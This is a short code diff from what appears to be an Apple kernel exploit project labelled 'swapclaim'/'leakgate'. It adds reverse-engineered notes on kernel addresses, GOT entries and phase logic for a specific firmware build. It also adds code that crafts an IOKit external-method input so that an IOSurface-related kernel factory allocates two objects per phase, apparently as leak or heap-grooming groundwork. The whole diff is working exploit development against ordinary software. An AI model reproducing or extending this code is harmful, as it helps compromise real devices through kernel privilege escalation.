@@ -100,7 +100,7 @@
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v2.2-leakgate-qbit"
+#define P110_BUILD      @"p110-swapclaim-v2.3-leakgate-count2"
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
 #define P110_PREFILL_DEF  6     /* the v1 shipped prefill(6) pop-law value   */
@@ -501,6 +501,18 @@ static void p110_leak_queue(void) {
     static uint8_t qBuf[0xFA8];
     memset(qBuf, 0, sizeof(qBuf));
     qBuf[0xFA4] = 0x01;
+    /* v2.3 PHASE LAW (byte-verified 24A435 0x909b2e8-family, 2026-10-27):
+       the 4-phase builder's phases 1..3 require in[0] > 1 (else 2bd+5=2c2)
+       and each passes (count=2, in+4) to the shared factory (0x908f9d4)
+       which instantiates TWO objects per phase via the IOSurface-kext
+       create stub (GOT 0x81153e0 -> 0xa344130). Phase 0 (0x908f5ec) reads
+       in[0] itself (0x908f664) and walks u32 tags post-increment
+       (0x908f6cc). So in[0] = the object count, legal window (front gate
+       <= 0x3e8 AND phases > 1) -> 2; tags at in[4]/in[8] = the factory
+       params (tagn 0 = the first probe value). */
+    *(uint32_t *)(void *)qBuf = 0x2;          /* word0 = count 2        */
+    *(uint32_t *)(void *)(qBuf + 4) = 0x0;    /* tag1 (factory param)   */
+    *(uint32_t *)(void *)(qBuf + 8) = 0x0;    /* tag2 (factory param)   */
     size_t qOutLen = sizeof(qBuf);
     uint64_t qOut[4] = {0};
     kern_return_t krQ = g_p110_callStruct(g_p110_m2conn, 6, qBuf, qsz, qOut, &qOutLen);
